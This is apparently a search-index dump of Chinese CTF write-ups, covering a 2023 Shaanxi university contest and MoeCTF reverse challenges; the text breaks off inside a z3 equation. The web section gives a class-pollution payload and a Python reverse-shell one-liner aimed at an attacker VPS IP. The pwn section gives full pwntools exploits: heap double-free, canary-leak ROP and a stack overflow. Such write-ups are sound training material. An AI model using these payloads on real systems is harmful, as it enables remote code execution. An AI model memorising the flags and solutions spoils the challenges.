[{"categories":["WP"],"content":"\r1 排名 ","date":"2024-05-05","objectID":"/posts/edebc43/:1:0","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2 解题思路","date":"2024-05-05","objectID":"/posts/edebc43/:2:0","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.1 WEB\r2.1.1 easyrce过滤了一些东西，用 file 伪协议即可 http://1d99bce9.clsadp.com/?PK=file:///flag得到 flag flag{95fbdea5c514a22bbfb4cd91c068560f} 2.1.2 mua 扫目录访问 robots.txt ，根据提示访问 /substr_pass.php 在 /substr_pass.php 页面中查看源代码发现存在提示传参 a=xx\u0026b=xx 根据文件名 substr_pass 猜测用于切割密码，且每次切割查看最多的长度是 3，且爆破后发现长度到 81 后截止，直接脚本跑密码 import requests url = 'http://5756eee1.clsadp.com/substr_pass.php?a=%s\u0026b=3' all = b'' for i in range(0,82,3): b = url % i r = requests.get(url=b) all += r.content[:3] print(all.decode()) #password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善\u003c #最后的 `\u003c` 符号需要去掉 访问 shell.php 构造 payload 即可 http://5756eee1.clsadp.com/shell.php?pass=password%E6%98%AF%E5%AF%8C%E5%BC%BA%E6%B0%91%E4%B8%BB%E6%96%87%E6%98%8E%E5%92%8C%E8%B0%90%E8%87%AA%E7%94%B1%E5%B9%B3%E7%AD%89%E5%85%AC%E6%AD%A3%E6%B3%95%E5%88%B6%E7%88%B1%E5%9B%BD%E6%95%AC%E4%B8%9A%E8%AF%9A%E4%BF%A1%E5%8F%8B%E5%96%84\u0026cmd=cat%20/h*flag{d6ad3f657b1c54ba8336c170d7b762b9} 2.1.3 PPP 通过 merge 函数原型链污染修改 evilFunc 函数的默认 shell 值即可 POST / HTTP/1.1 Host: 648bc958.clsadp.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/form-json Content-Length: 95 {\"__class__\": {\"__init__\": {\"__globals__\": {\"evilFunc\": {\"__kwdefaults__\": {\"shell\": true}}}}}} 然后访问 / 路由，执行命令即可，由于命令返回值是 print ，而不是 return ，所以需要反弹，但是靶机上使用 nc 反弹失败，改用 python 即可 vps 端进行监听 nc -lvvp 8080http://648bc958.clsadp.com/eval?cmd=python%20-c%20%22import%20os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27120.48.7.238%27,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%27/bin/bash%27,%27-i%27]);%22 flag{83fa778552fddfa2a188a89f281b580b} ","date":"2024-05-05","objectID":"/posts/edebc43/:2:1","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.2 REVERSE\r2.2.1 ezpython使用 pyinstxtractor 解包 python3 pyinstxtractor.py main.exe得到 解包后的文件夹，找到 main.pyc 后，进行反编译 uncompyle6 main.pyc \u003e main.py得到源码 # uncompyle6 version 3.9.0 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.7.16 (default, Jan 17 2023, 16:06:28) [MSC v.1916 64 bit (AMD64)] # Embedded file name: main.py import sys str = 'cidb~071c75g62=a=d2=acc211c010`1\u003c`gacx' str1 = '' flag = input('�������flag��') if len(flag) != 38: print('The length you enter is 38.......no no no no not flag') sys.exit() for i in range(38): str1 += chr(ord(flag[i]) ^ 5) else: if str1 == str: print('yes is flag') else: print('no no no no........') # okay decompiling main.pyc简单异或，直接编写脚本即可 str = 'cidb~071c75g62=a=d2=acc211c010`1\u003c`gacx' for i in str: i = chr(ord(i) ^ 5) print(i,end='') #flag{524f20b378d8a78dff744f545e49ebdf}\r2.2.2 ezpe使用strings查看文件得到两段字符串 Yes,you found me!Now I can tell you,flag is flag{key1_key2},but where is the key???Do not frustrated!I can give you key1,key1:w0w! Now go find key2! +++++ +++++ [-\u003e++ +++++ +++\u003c] \u003e++++ +++.- ----- .\u003c+++ +[-\u003e+ +++\u003c] \u003e++++ .\u003c+++ +++++ [-\u003e-- ----- -\u003c]\u003e- ----- -.+++ +++++ .\u003c+++ +[-\u003e+ +++\u003c] \u003e++++ ++.\u003c+ ++[-\u003e ---\u003c] \u003e--.\u003c +++++ [-\u003e++ +++\u003c] \u003e+.\u003c+ +++[- \u003e++++ \u003c]\u003e++ ++.\u003c+ ++++[ -\u003e--- --\u003c]\u003e ----- -.\u003c++ +++[- \u003e---- -\u003c]\u003e- ----- --.\u003c+ +++++ ++[-\u003e +++++ +++\u003c] \u003e++.\u003c ++++[ -\u003e--- -\u003c]\u003e- -.\u003c++ ++[-\u003e ++++\u003c ]\u003e+.\u003c +++++ [-\u003e-- ---\u003c] \u003e---- --.\u003c+ ++++[ -\u003e--- --\u003c]\u003e ----- ----. \u003c++++ +++[- \u003e++++ +++\u003c] \u003e+.-- ----. \u003c++++ ++[-\u003e ----- -\u003c]\u003e- ----- ----. \u003c+++[ -\u003e--- \u003c]\u003e-- --.\u003c+ +++++ +[-\u003e+ +++++ +\u003c]\u003e+ +++++ ++++. \u003c++++ [-\u003e++ ++\u003c]\u003e ++++. ++.\u003c+ +++++ +[-\u003e- ----- -\u003c]\u003e- -.\u003c++ +++++ [-\u003e++ +++++ \u003c]\u003e+. \u003c++++ ++++[ -\u003e--- ----- \u003c]\u003e-- -.\u003c++ +++++ [-\u003e++ +++++ \u003c]\u003e++ +.\u003c在线 brainfuck 解密后，得到 key2 PE_sT3uctU3e_1$_suBt1e flag{w0w!_PE_sT3uctU3e_1$_suBt1e}","date":"2024-05-05","objectID":"/posts/edebc43/:2:2","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.3 Misc\r2.3.1 云璎谐音，云影密码 def de_code(c): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] flag = [] c2 = [i for i in c.split(\"0\")] for i in c2: c3 = 0 for j in i: c3 += int(j) flag.append(dic[c3 - 1]) return flag def encode(plaintext): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] m = [i for i in plaintext] tmp = []; flag = [] for i in range(len(m)): for j in range(len(dic)): if m[i] == dic[j]: tmp.append(j + 1) for i in tmp: res = \"\" if i \u003e= 8: res += int(i / 8) * \"8\" if i % 8 \u003e= 4: res += int(i % 8 / 4) * \"4\" if i % 4 \u003e= 2: res += int(i % 4 / 2) * \"2\" if i % 2 \u003e= 1: res += int(i % 2 / 1) * \"1\" flag.append(res + \"0\") print(\"\".join(flag)[:-1]) c = input(\"输入要解密的数字串:\") print(de_code(c)) m_code = input(\"请输入要加密的数字串:\") encode(m_code) md5 加密后得到 flag flag{9edabf1448871181eb0e7133b5b3d701}","date":"2024-05-05","objectID":"/posts/edebc43/:2:3","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.4 Pwn\r2.4.1 勇闯迷宫-过三关from pwn import * e=ELF(\"./pwn\") context.binary=e libc=ELF(\"./libc-2.23.so\") import sys if len(sys.argv)==1: p=process(\"./pwn\") gdb.attach(p) pause() else: p=remote(sys.argv[1],sys.argv[2]) context.log_level='debug' p.sendlineafter(\":\\n\",'516') p.sendlineafter('\u003e\u003e ','1') p.sendlineafter('\u003e\u003e ','4') p.sendlineafter('\u003e\u003e ','2') p.sendlineafter('\u003e\u003e ','3') p.sendlineafter('\u003e\u003e ','2') p.sendlineafter('\u003e\u003e ',str(133)) p.sendline(str(0x4014b4)) p1=\"I_LOVE$$CTF_IN5.16 R0OT\" p2=\"I_LOVE$$APPLES65.16 R0OT\" n=1 def check(): global n p.sendlineafter('\u003e',p2) p.sendlineafter('\u003e',p2) p.sendlineafter('hahahha,','0') def add(ind,size,data=' '): p.sendlineafter('\u003e:','1') p.sendlineafter('Index: ',str(ind)) p.sendlineafter('Size: ',str(size)) p.sendlineafter('Content: ',data) pass def free(ind): p.sendlineafter('\u003e:','3') p.sendlineafter('Index: ',str(ind)) pass def show(ind): p.sendlineafter('\u003e:','2') p.sendlineafter('Index: ',str(ind)) pass check() add(0,0xf0) add(1,0x68) add(2,0x68) add(3,0x68) free(0) show(0) d=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00')) print(hex(d)) libc.address=d-libc.sym['__malloc_hook']-0x58-0x10 print(hex(libc.address)) free_hook=libc.sym['__free_hook']-0x14 system=libc.sym['system'] malloc_hook=libc.sym['__malloc_hook']-0x23 gadget=libc.address+0xf1247 free(2) free(1) free(2) add(4,0x68,p64(malloc_hook)) add(5,0x68,b'/bin/sh\\x00') add(6,0x68) add(7,0x68,b'a'*0x13+p64(gadget)) p.sendlineafter('\u003e:','1') p.sendlineafter('Index: ','9') p.sendlineafter('Size: ','12') p.interactive()\r2.4.2 canaryfrom pwn import * import sys from ctypes import * dll=CDLL(\"./libc\") e=ELF(\"./pwn\") libc=ELF(\"./libc.so.6\") p=remote(sys.argv[1],sys.argv[2]) p.sendlineafter('select:','1') p.readuntil(\"Go:\\n\") dll.srand(dll.time(0)) n=dll.rand()%100+1 p.sendline(str(n)) context.log_level='debug' p.read(0x28) can=u64(p.read(8)) print(hex(can)) p.read(0x10+0x10+0x8) libc_start_main=u64(p.read(8)) print(hex(libc_start_main)) libc.address=libc_start_main-0x29d90 print(hex(libc.address)) rdi=0x0000000000400b93 bin_sh=next(libc.search(b'/bin/sh\\x00')) system=libc.sym['system'] ret=0x000000000040073e p.sendline(b'a'*0x28+p64(can)+b'b'*8+p64(rdi)+p64(bin_sh)+p64(ret)+p64(system)) p.interactive()\r2.4.3 stackfrom pwn import * import sys p=remote(sys.argv[1],sys.argv[2]) p.sendlineafter('name?','a') p.sendlineafter('you?',b'a'*0x90+b'b'*8+p64(0x40082e)) p.interactive()","date":"2024-05-05","objectID":"/posts/edebc43/:2:4","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r1 Reverse入门指北 INTRO_RE.exe 使用 ida 打开，调用 F12 查看字符串即可 moectf{F1rst_St3p_1s_D0ne}","date":"2024-05-05","objectID":"/posts/54f90da/:1:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r2 base_64 base64.pyc 考的是 python 的逆向，需要将 .pyc 文件进行反编译 使用工具 uncompyle6 将 .pyc 文件反编译为 py 文件即可 uncompyle6 -o base_64.py base_64.pyc得到原始代码 import base64 from string import * str1 = 'yD9oB3Inv3YAB19YynIuJnUaAGB0um0=' string1 = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/' string2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' flag = input('welcome to moectf\\ninput your flag and I wiil check it:') enc_flag = base64.b64encode(flag.encode()).decode() enc_flag = enc_flag.translate(str.maketrans(string2, string1)) if enc_flag == str1: print('good job!!!!') else: print('something wrong???') exit(0)很明显的 base64 换表，核心是 maketrans 函数，需要讲原表 string2 和 新表 string1 进行替换，长度一样即可 moectf{pYc_And_Base64~}","date":"2024-05-05","objectID":"/posts/54f90da/:2:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r3 UPX! UPX!.exe 根据题目名也可以知道这个程序经过 upx 加壳，使用 upx 脱壳即可 upx -d \"UPX!.exe\"脱壳后使用 ida 打开，找到核心的代码 __int64 sub_140079760() { char *v0; // rdi __int64 i; // rcx unsigned __int64 v2; // rax char v4[32]; // [rsp+0h] [rbp-20h] BYREF char v5; // [rsp+20h] [rbp+0h] BYREF char v6[76]; // [rsp+28h] [rbp+8h] BYREF int j; // [rsp+74h] [rbp+54h] unsigned __int64 v8; // [rsp+148h] [rbp+128h] v0 = \u0026v5; for ( i = 34i64; i; --i ) { *(_DWORD *)v0 = -858993460; v0 += 4; } sub_140075557(\u0026unk_1401A7008); sub_140073581(\"welcome to moectf\"); sub_140073581(\"I put a shell on my program to prevent you from reversing it, you will never be able to reverse it hhhh~~\"); sub_140073581(\"Now tell me your flag:\"); memset(v6, 0, 0x2Aui64); sub_1400727F8(\"%s\", v6); for ( j = 0; ; ++j ) { v8 = j; v2 = sub_140073829(v6); if ( v8 \u003e= v2 ) break; v6[j] ^= 0x67u; if ( byte_140196000[j] != v6[j] ) { sub_140073973(\"try again~~\"); sub_1400723F7(0i64); } } sub_140073973(\"you are so clever!\"); sub_140074BCF(v4, \u0026unk_140162070); return 0i64; }已加密的变量在 byte_140196000，且将每个明文的值去异或上 0x67 ,最后与密文比较，就是加密过程 解密脚本如下 flag = \"0A 08 02 04 13 01 1C 57 0F 38 1E 57 12 38 2C 09 57 10 38 2F 57 10 38 13 08 38 35 02 11 54 15 14 02 38 32 37 3F 46 46 46 1A\".split(\" \") for i in flag: print(chr(int(i,16) ^ 0x67),end='')运行即可得到 flag moectf{0h_y0u_Kn0w_H0w_to_Rev3rse_UPX!!!}","date":"2024-05-05","objectID":"/posts/54f90da/:3:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r4 Xor XOR.exe ida 打开后的入口反编译就是题目代码 __int64 __fastcall main() { int i; // [rsp+2Ch] [rbp-34h] unsigned __int8 input[29]; // [rsp+30h] [rbp-30h] BYREF int v3; // [rsp+5Ch] [rbp-4h] _main(); v3 = 0; memset(input, 0, sizeof(input)); printf(\"Please input the flag:\\n\"); gets(input); for ( i = 0; i \u003c 28; ++i ) { if ( enc[i] != (input[i] ^ 0x39) ) { puts(\"Seems not right\"); exit(0); } } puts(\"GOOD!\"); return 0i64; }上面程序中，可以得知，密文为 enc，且将输入的明文一一异或 0x39 并和对应下标密文对比，解密手段可以参照上一题 flag = \"54 56 5C 5A 4D 5F 42 60 56 4C 66 52 57 09 4E 66 51 09 4E 66 4D 09 66 61 09 6B 18 44\".split(\" \") for i in flag: print(chr(int(i,16) ^ 0x39),end='')运行后即可得到 flag moectf{You_kn0w_h0w_t0_X0R!}","date":"2024-05-05","objectID":"/posts/54f90da/:4:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r5 ANDROID BasicAndroid.apk 使用 jadx 工具对其进行反编译 具体的代码在 com.doctor3.basicandroid4 的 MainActivity 函数体中 public class MainActivity extends AppCompatActivity { char[] enc = {25, 7, 0, 14, 27, 3, 16, '/', 24, 2, '\\t', ':', 4, 1, ':', '*', 11, 29, 6, 7, '\\f', '\\t', '0', 'T', 24, ':', 28, 21, 27, 28, 16}; char[] key = {'t', 'h', 'e', 'm', 'o', 'e', 'k', 'e', 'y'}; /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); final EditText editText = (EditText) findViewById(R.id.input); ((Button) findViewById(R.id.check)).setOnClickListener(new View.OnClickListener() { // from class: com.doctor3.basicandroid.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { String obj = editText.getText().toString(); if (obj.length() != 31) { Toast.makeText(MainActivity.this.getApplicationContext(), \"长度不对哦\", 0).show(); return; } byte[] bytes = obj.getBytes(); for (int i = 0; i \u003c 31; i++) { if ((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) != MainActivity.this.enc[i]) { Toast.makeText(MainActivity.this.getApplicationContext(), \"好像有哪里不对\", 0).show(); return; } } Toast.makeText(MainActivity.this.getApplicationContext(), \"恭喜！回答正确\", 0).show(); } }); } }可以得到以下信息 密文为 enc 变量 key 变量是异或的值 输入的明文与 key 进行异或后，和密文 enc 对应的下标进行对比 这里可以将 key 理解为 repeat 成长度为 31 的新 key,或每次越界后从头开始，取余即可，以下是解密脚本 flag = [25, 7, 0, 14, 27, 3, 16, '/', 24, 2, '\\t', ':', 4, 1, ':', '*', 11, 29, 6, 7, '\\f', '\\t', '0', 'T', 24, ':', 28, 21, 27, 28, 16] key = ['t', 'h', 'e', 'm', 'o', 'e', 'k', 'e', 'y'] for i,v in enumerate(flag): if type(v) != int: v = ord(v); print(chr(v ^ (ord(key[i % len(key)]))),end='')直接运行即可 moectf{Java_in_Android_1s_easy}","date":"2024-05-05","objectID":"/posts/54f90da/:5:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r6 RRRRRc4 RRRRRc4.exe 看题目名称，应该可以知道考的是 RC4 算法 __int64 sub_140079A70() { char *v0; // rdi __int64 i; // rcx char v3[32]; // [rsp+0h] [rbp-30h] BYREF char v4; // [rsp+30h] [rbp+0h] BYREF char v5[256]; // [rsp+40h] [rbp+10h] BYREF char v6[256]; // [rsp+160h] [rbp+130h] BYREF char v7[44]; // [rsp+278h] [rbp+248h] BYREF int v8; // [rsp+2A4h] [rbp+274h] int j; // [rsp+2C4h] [rbp+294h] v0 = \u0026v4; for ( i = 172i64; i; --i ) { *(_DWORD *)v0 = -858993460; v0 += 4; } sub_14007555C(\u0026unk_1401A7007); memset(v5, 0, sizeof(v5)); memset(v6, 0, sizeof(v6)); strcpy(v7, \"moectf2023\"); v8 = 0; sub_140073581(\"welcome to moectf!!!\"); sub_140073581(\"This is a very common algorithm \"); sub_140073581(\"show your flag:\"); sub_1400727F8(\"%s\", byte_140197260); if ( sub_140073829(byte_140197260) == 37 ) { sub_140075052((unsigned int)v5, (unsigned int)v6, (unsigned int)byte_140197260, 38, (__int64)v7, 10); for ( j = 0; (unsigned __int64)j \u003c 0x26; ++j ) { if ( byte_140196000[j] == (unsigned __int8)byte_140197260[j] ) ++v8; } } if ( v8 == 37 ) sub_140073973(\"right!flag is your input!\"); else sub_140073973(\"try again~\"); sub_140074BCF(v3, \u0026unk_140162100); return 0i64; }这里只是外部，用来对比校验结果是否符合的，先将密文提取，在变量 byte_140196000 中 密文如下: 1B 9B FB 19 06 6A B5 3B 7C BA 03 F3 91 B8 B6 3D 8A C1 48 2E 50 11 E7 C7 4F B1 27 CF F3 AE 03 09 B2 08 FB DC 22分析下，加密的函数应该是这段 sub_140075052((unsigned int)v5, (unsigned int)v6, (unsigned int)byte_140197260, 38, (__int64)v7, 10);进去看函数的具体实现如下 __int64 __fastcall sub_1400795E0(__int64 a1, __int64 a2, __int64 a3, int a4, __int64 a5, unsigned int a6) { __int64 result; // rax int i; // [rsp+24h] [rbp+4h] int j; // [rsp+24h] [rbp+4h] int v9; // [rsp+24h] [rbp+4h] int v10; // [rsp+44h] [rbp+24h] int v11; // [rsp+44h] [rbp+24h] char v12; // [rsp+64h] [rbp+44h] char v13; // [rsp+64h] [rbp+44h] int v14; // [rsp+A4h] [rbp+84h] result = sub_14007555C(\u0026unk_1401A7007); v10 = 0; v14 = 0; for ( i = 0; i \u003c 256; ++i ) { *(_BYTE *)(a1 + i) = i; *(_BYTE *)(a2 + i) = *(_BYTE *)(a5 + i % a6); result = (unsigned int)(i + 1); } for ( j = 0; j \u003c 256; ++j ) { v10 = (*(unsigned __int8 *)(a2 + j) + *(unsigned __int8 *)(a1 + j) + v10) % 256; v12 = *(_BYTE *)(a1 + v10); *(_BYTE *)(a1 + v10) = *(_BYTE *)(a1 + j); *(_BYTE *)(a1 + j) = v12; result = (unsigned int)(j + 1); } v9 = 0; v11 = 0; while ( a4 ) { v9 = (v9 + 1) % 256; v11 = (*(unsigned __int8 *)(a1 + v9) + v11) % 256; v13 = *(_BYTE *)(a1 + v11); *(_BYTE *)(a1 + v11) = *(_BYTE *)(a1 + v9); *(_BYTE *)(a1 + v9) = v13; *(_BYTE *)(a3 + v14++) ^= *(_BYTE *)(a1 + (*(unsigned __int8 *)(a1 + v11) + *(unsigned __int8 *)(a1 + v9)) % 256); result = (unsigned int)--a4; } return result; }确实是 RC4 的实现，那么解密就很快了，由于该加密是对称加密，所以密文同时也是密文，现在，还需要一个 key 在第一段函数体中，可以看到加密函数传参了 6 个参数，其中 v7 是 key ，也就是 moectf2023 解密得到 flag moectf{y0u_r3a11y_understand_rc4!!!!}","date":"2024-05-05","objectID":"/posts/54f90da/:6:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r7 SMC SMC.exe 核心的内容如下 int __cdecl main_0(int argc, const char **argv, const char **envp) { char v4; // [esp+0h] [ebp-78h] char v5; // [esp+0h] [ebp-78h] char v6[104]; // [esp+Ch] [ebp-6Ch] BYREF sub_401087(aPlzInputYourFl, v4); sub_401023(aS, (char)v6); sub_4011E0(); if ( sub_401050(v6) ) sub_401087(aGood, v5); else sub_401087(aTryAgainPlease, v5); return 0; }可知，当满足 sub_401050(v6) 后，即可，但是却无法分析 sub_401050 函数的具体实现 // attributes: thunk void __cdecl sub_401050(int a1) { JUMPOUT(0x4014D0); }转到反汇编处，看到跳转到了另一个函数处 jmp loc_4014D0跟进后可以看到 loc_4014D0 这个函数的汇编，都是一些赋值操作，但是在最后，有一段数据区 在交叉引用处，发现另外一个函数中，也有此函数出现 int sub_401550() { int result; // eax int i; // [esp+4h] [ebp-1Ch] DWORD flOldProtect[2]; // [esp+18h] [ebp-8h] BYREF flOldProtect[1] = -858993460; flOldProtect[0] = (DWORD)malloc(8u); result = VirtualProtect((char *)\u0026loc_4014D0 - (unsigned int)\u0026loc_4014D0 % 0x1000, 0x1000u, 0x80u, flOldProtect); for ( i = 0; i \u003c 122; ++i ) { *((_BYTE *)\u0026loc_4014D0 + i) ^= 0x66u; result = i + 1; } return result; }这里将 loc_4014D0 开始的值逐一进行异或，交叉引用后发现，该函数体被入口处的 main 函数体中的 sub_4011E0 方法调用 在调用该函数后，调用了 sub_401050(v6),所以基本可以确定这个程序在运行时，修改了自身，即 SMC 解释如下 SMC，即Self Modifying Code，动态代码加密技术，指通过修改代码或数据，阻止别人直接静态分析，然后在动态运行程序时对代码进行解密，达到程序正常运行的效果。 而计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。 通常来说，SMC使用汇编去写会比较好，因为它涉及更改机器码，但SMC也可以直接通过C、C++来实现。 看到这，差不多就明白了，需要进行动态调试拿到解析后的代码才能分析，那么现在有两种选择 动态调试，得到修改后的代码再进行分析 分析程序，自己写代码，手动修改，得到代码 7.0.1 方法一先说第一种方法，动态调试，这里选择使用 dbg 进行动态调试，设置函数调用前的断点，并用插件 Scylla 的功能保存当前状态的程序，得到真实的代码 得到保存后的二进制文件 SMC_dump.exe 后，再使用 ida 重新进行分析，就能看到 sub_401050 函数的真实代码了 int __cdecl sub_4014D0(char *Str) { size_t i; // [esp+0h] [ebp-8h] int v3; // [esp+4h] [ebp-4h] v3 = 1; for ( i = 0; i \u003c strlen(Str); ++i ) { if ( ((unsigned __int8)(Str[i] + 57) ^ 0x39) != (unsigned __int8)byte_40A000[i] ) v3 = 0; } return v3; }这段程序中，输入的值先加上 57 再 异或 0x39 ，并于密文变量 byte_40A000 一一比较，所以，提取该变量的值，并逆向即可 7.0.2 方法二第二种方法就是找到程序运行中，修改自身的代码，并复刻修改地址的代码， 手动编写代码运行来修改，从而得到修改后的代码。 上面说了，在函数 sub_401550() 中，就是目标的修改代码，所以我们可以复制他的方法，编写 idc 来手动模拟程序运行到这个方法。 下面是编写的 idc 代码，运行即可 static main(){ auto address = 0x4014d0; auto i; for(i=0;i\u003c122;i++){ PatchByte(address+i,Byte(address+i) ^ 0x66); } Message(\"patch ok\"); }运行代码后，整个程序变为 将多余出来，没有识别的数据，识别为汇编即可，然后创建函数，即可反编译，得到解密后的真实代码 int __cdecl sub_4014D0(char *Str) { size_t i; // [esp+0h] [ebp-8h] int v3; // [esp+4h] [ebp-4h] v3 = 1; for ( i = 0; i \u003c strlen(Str); ++i ) { if ( ((unsigned __int8)(Str[i] + 57) ^ 0x39) != (unsigned __int8)byte_40A000[i] ) v3 = 0; } return v3; }最后解密程序如下 flag = \"9F 91 A7 A5 94 A6 8D B5 A7 9C A6 A1 BF 91 A4 53 A6 53 A5 A3 94 9B 91 9E 8F\".split(\" \") for i in flag: print(chr((int(i,16) ^ 0x39) - 57),end='')Flag 如下 moectf{Self_Mod1f1cation}","date":"2024-05-05","objectID":"/posts/54f90da/:7:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r8 EQUATION EQUATION.exe 用 ida 分析，发现一段很长的多个 if 判断条件，且是运算公式，应该是考察 z3 库的使用，直接贴代码了 from z3 import * ques = open('question.txt','r').read().replace(' ','').replace('\\n','').replace('!=','==').replace('\u003c\u003c','*2**').split('||') for i in range(31): exec( f\"v4_{i} = Int('v4_{i}')\" ) for j in range(0,len(ques)): ques[j] = ques[j].replace( f\"v4[{i}]\", f\"v4_{i}\" ) s = Solver() for i in ques: exec( f\"s.add({i})\" ) if s.check(): model = s.model() for i in range(31): print( chr( int( str( s.model().eval(eval(f\"v4_{i}\")) ) ) ), end=\"\" )其中 question.txt 的内容如下 334 * v4[28] + 100 * v4[27] + 369 * v4[26] + 124 * v4[25] + 278 * v4[24] + 158 * v4[23] + 162 * v4[22] + 145 * v4[19] + 27 * v4[17] + 91 * v4[15] + 195 * v4[14] + 342 * v4[13] + 391 * v4[10] + 204 * v4[9] + 302 * v4[8] + 153 * v4[7] + 292 * v4[6] + 382 * v4[5] + 221 * v4[4] + 316 * v4[3] + 118 * v4[2] + 295 * v4[1] + 247 * v4[0] + 236 * v4[11] + 27 * v4[12] + 361 * v4[16] + 81 * v4[18] + 105 * v4[20] + 65 * v4[21] + 67 * v4[29] + 41 * v4[30] != 596119 || 371 * v4[29] + 338 * v4[28] + 269 * v4[27] + 312 * v4[26] + 67 * v4[25] + 299 * v4[24] + 235 * v4[23] + 294 * v4[22] + 303 * v4[21] + 211 * v4[20] + 122 * v4[19] + 333 * v4[18] + 341 * v4[15] + 111 * v4[14] + 253 * v4[13] + 68 * v4[12] + 347 * v4[11] + 44 * v4[10] + 262 * v4[9] + 357 * v4[8] + 323 * v4[5] + 141 * v4[4] + 329 * v4[3] + 378 * v4[2] + 316 * v4[1] + 235 * v4[0] + 59 * v4[6] + 37 * v4[7] + 264 * v4[16] + 73 * v4[17] + 126 * v4[30] != 634009 || 337 * v4[29] + 338 * v4[28] + 118 * v4[27] + 82 * v4[26] + 239 * v4[21] + 58 * v4[20] + 304 * v4[19] + 330 * v4[18] + 377 * v4[17] + 306 * v4[16] + 221 * v4[13] + 345 * v4[12] + 124 * v4[11] + 272 * v4[10] + 270 * v4[9] + 229 * v4[8] + 377 * v4[7] + 373 * v4[6] + 297 * v4[5] + 112 * v4[4] + 386 * v4[3] + 90 * v4[2] + 361 * v4[1] + 236 * v4[0] + 386 * v4[14] + 73 * v4[15] + 315 * v4[22] + 33 * v4[23] + 141 * v4[24] + 129 * v4[25] + 123 * v4[30] != 685705 || 367 * v4[29] + 55 * v4[28] + 374 * v4[27] + 150 * v4[24] + 350 * v4[23] + 141 * v4[22] + 124 * v4[21] + 366 * v4[20] + 230 * v4[19] + 307 * v4[18] + 191 * v4[17] + 153 * v4[12] + 383 * v4[11] + 145 * v4[10] + 109 * v4[9] + 209 * v4[8] + 158 * v4[7] + 221 * v4[6] + 188 * v4[5] + 22 * v4[4] + 146 * v4[3] + 306 * v4[2] + 230 * v4[1] + 13 * v4[0] + 287 * v4[13] + 257 * v4[14] + 137 * v4[15] + 7 * v4[16] + 52 * v4[25] + 31 * v4[26] + 355 * v4[30] != 557696 || 100 * v4[29] + 191 * v4[28] + 362 * v4[27] + 55 * v4[26] + 210 * v4[25] + 359 * v4[24] + 348 * v4[21] + 83 * v4[20] + 395 * v4[19] + 350 * v4[16] + 291 * v4[15] + 220 * v4[12] + 196 * v4[11] + 399 * v4[8] + 68 * v4[7] + 84 * v4[6] + 281 * v4[5] + 334 * v4[4] + 53 * v4[3] + 399 * v4[2] + 338 * v4[0] + 18 * v4[1] + 148 * v4[9] + 21 * v4[10] + 174 * v4[13] + 36 * v4[14] + 2 * v4[17] + 41 * v4[18] + 137 * v4[22] + 24 * v4[23] + 368 * v4[30] != 538535 || 188 * v4[29] + (v4[26] \u003c\u003c 7) + 93 * v4[25] + 248 * v4[24] + 83 * v4[23] + 207 * v4[22] + 217 * v4[19] + 309 * v4[16] + 16 * v4[15] + 135 * v4[14] + 251 * v4[13] + 200 * v4[12] + 49 * v4[11] + 119 * v4[10] + 356 * v4[9] + 398 * v4[8] + 303 * v4[7] + 224 * v4[6] + 208 * v4[5] + 244 * v4[4] + 209 * v4[3] + 189 * v4[2] + 302 * v4[1] + 395 * v4[0] + 314 * v4[17] + 13 * v4[18] + 310 * v4[20] + 21 * v4[21] + 67 * v4[27] + 127 * v4[28] + 100 * v4[30] != 580384 || 293 * v4[29] + 343 * v4[28] + 123 * 